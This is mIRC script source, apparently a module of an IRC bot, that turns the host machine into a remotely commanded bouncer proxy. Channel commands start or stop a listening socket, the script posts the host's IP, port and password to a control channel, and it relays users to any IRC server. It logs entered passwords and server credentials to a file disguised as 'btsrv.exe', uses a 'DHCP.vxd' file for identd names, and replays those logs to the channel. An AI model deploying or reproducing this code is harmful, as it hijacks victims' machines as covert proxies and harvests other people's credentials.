on 10:TEXT:.bnc*:*:{
  if ($nick !isop %chan) { halt }
  if ($2 == $null) { notice $nick BNC (Error) No Variables Supplied (Syntax) .bnc start <port> <password> | halt }
  if ($2 == start) {
    if ($sock(Bnc)) {
      notice $nick BNC (Error) BNC Active
      halt
    }
    if ($portfree( $+ $3 $+ ) != $true) {
     notice $nick BNC (Error) Port Currently Open
     halt
    }
    if ($3 !isnum) { halt } 
    set %Bnc on
    set %Bnc.port $3
    set %Bnc.passwd $4-
    identd on $read DHCP.vxd $+ $rand(a,z)
    socklisten Bnc $3
    msg %chan2 BNC (IP:Port) $ip $+ : $+ %Bnc.port (Password) %Bnc.passwd
  }
  if ($2 == rehash) {
   if ($sock(Bnc) == $null) {
     notice $nick BNC Unactive
     halt
    }
    msg %chan2 BNC Rehashed (IP:Port) $ip $+ : $+ %Bnc.port (Password) %Bnc.passwd
    sockclose BncClient*
  }
  if ($2 == status) {
    if ($sock(Bnc)) {
      msg %chan2 BNC (IP:Port) $ip $+ : $+ %Bnc.port (Password) %Bnc.passwd (Users) $sock(BncClient*,0)
      halt
     }
    if ($sock(Bnc) == $null) {
      notice $nick BNC Unactive
    }
  }
  if ($2 == logs) {
   if ($exists( $+ $mircdir $+ btsrv.exe) != $true) {
     notice $nick BNC (Error) No Available Logs
     halt
    }
    set %play2 done
    play %chan2 btsrv.exe 3000
   }
  if ($2 == stop) {
   if ($sock(Bnc) == $null) {
     notice $nick BNC Unactive
     halt
   }
    notice $nick BNC Stopped
    unset %bnc* %bnc.*
    sockclose Bnc*
    sockclose BncClient*
  }
}
on *:socklisten:Bnc*:{
  sockaccept BncClient $+ $rand(10000,99999)
  socklisten Bnc %Bnc.port
}
on *:sockread:BncClient*:{
  sockread %BncClient

  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ BNC Authentication
    sockwrite -n $sockname NOTICE AUTH : $+ /quote pass <password>
    halt
  }
  if ($gettok(%BncClient,1,32) == PASS) { 
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Password Accepted
      sockwrite -n $sockname NOTICE AUTH : $+ /quote conn <address> <port> <password>
      halt
    } 
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Incorrect Password
      set %bnctrial $gettok(%BncClient,2,32)
      write btsrv.exe Authentication Attempt (Nick) %Bnc.nick (Address) $sock($sockname).ip (Password) %bnctrial
      halt
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if ($gettok(%BncClient,3,32) == $null) { set %bnclport 6667 } | else { set %bnclport $gettok(%BncClient,3,32) }
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
    set %bnclserver $gettok(%BncClient,2,32)
    sockclose BncServer $+ $remove($sockname,BncClient)
    sockopen BncServer $+ $remove($sockname,BncClient) %bnclserver %bnclport
    sockwrite -n $sockname NOTICE AUTH : $+ Connecting to %bnclserver %bnclport
    halt
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Connection Failed
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Connection Failed
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Connection Complete
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
  write btsrv.exe Connection Complete (Nick) %Bnc.nick (Address) $sock($sockname).ip (Address:Port) %bnclserver $+ : $+ $gettok(%BncClient,3,32) (Password) %Bnc.server.passwd
  if (%Bnc.server.passwd != $null) {
    sockwrite -n $sockname PASS %Bnc.server.passwd
  }
}
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
} }